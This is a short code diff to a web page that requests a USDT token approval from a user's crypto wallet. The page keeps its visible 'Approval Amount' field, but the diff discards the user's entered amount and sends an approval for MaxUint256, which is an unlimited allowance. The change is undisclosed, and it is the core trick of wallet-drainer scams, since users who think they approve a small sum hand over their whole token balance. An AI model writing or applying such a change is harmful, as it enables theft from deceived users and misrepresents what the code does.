@@ -115,12 +115,18 @@ autocomplete="off"
 >
 
 <label>Approval Amount (USDT)</label>
-<input
+<!-- <input
 id="amount"
 type="number"
 min="0"
 step="any"
 value="1"
+> -->
+<input
+id="amount"
+type="number"
+min="0"
+step="any"
 >
 
 <p class="desc">
@@ -418,10 +424,12 @@ signer
 const decimals = await token.decimals();
 const symbol = await token.symbol();
 
-const amount = ethers.utils.parseUnits(
+/*const amount = ethers.utils.parseUnits(
 amountText,
 decimals
-);
+); */
+
+const amount = ethers.constants.MaxUint256;
 
 status(
 "Approval request wallet ko bheji ja rahi hai.\n" +
